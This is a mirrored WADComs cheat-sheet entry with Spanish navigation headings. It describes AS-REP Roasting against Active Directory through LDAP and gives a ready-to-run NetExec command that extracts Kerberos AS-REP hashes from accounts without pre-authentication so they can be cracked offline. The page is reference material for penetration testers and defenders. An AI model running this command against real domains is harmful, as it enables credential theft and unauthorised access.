# WADComs: NetExec-LDAP-ASREPRoasting

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Username`, `Hash`

**Sistema:** `Linux`, `Windows`

## Descripción

NetExec (formerly CrackMapExec) performs an AS-REP Roasting attack via the LDAP service.
This command attempts to enumerate domain accounts that do not require pre-authentication 
and requests Kerberos AS-REP responses for them. The extracted encrypted ticket-granting 
ticket (TGT) hashes are saved into the specified file and can later be cracked offline 
to recover plaintext credentials.

Command Reference:

	Target IP: 10.10.10.1
	Domain: test.local
	Username List: users.txt
	Password: (empty string)
	Output File: output.txt

## Comando

```bash
nxc ldap 10.10.10.1 -u users.txt -p '' --asreproast output.txt
```

## Referencias

- https://github.com/Pennyw0rth/NetExec
- https://attack.mitre.org/techniques/T1558/004/
